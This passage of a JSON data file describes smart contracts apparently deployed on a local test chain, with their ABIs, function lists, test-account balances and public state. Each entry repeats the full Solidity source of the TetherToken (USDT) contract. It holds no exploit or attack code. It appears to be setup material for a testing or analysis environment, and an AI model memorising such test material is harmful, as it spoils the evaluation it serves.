require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "Pausable",\n      "address": "0xA57B8a5584442B467b4689F1144D269d096A3daF",\n      "abi": [\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0xA57B8a5584442B467b4689F1144D269d096A3daF": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99747072680000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "paused": false,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "SafeMath",\n      "address": "0x630589690929E9cdEFDeF0734717a9eF3Ec7Fcfe",\n      "abi": [],\n      "functions": [],\n      "events": [],\n      "accounts_balances": {\n        "0x630589690929E9cdEFDeF0734717a9eF3Ec7Fcfe": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99747072680000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function 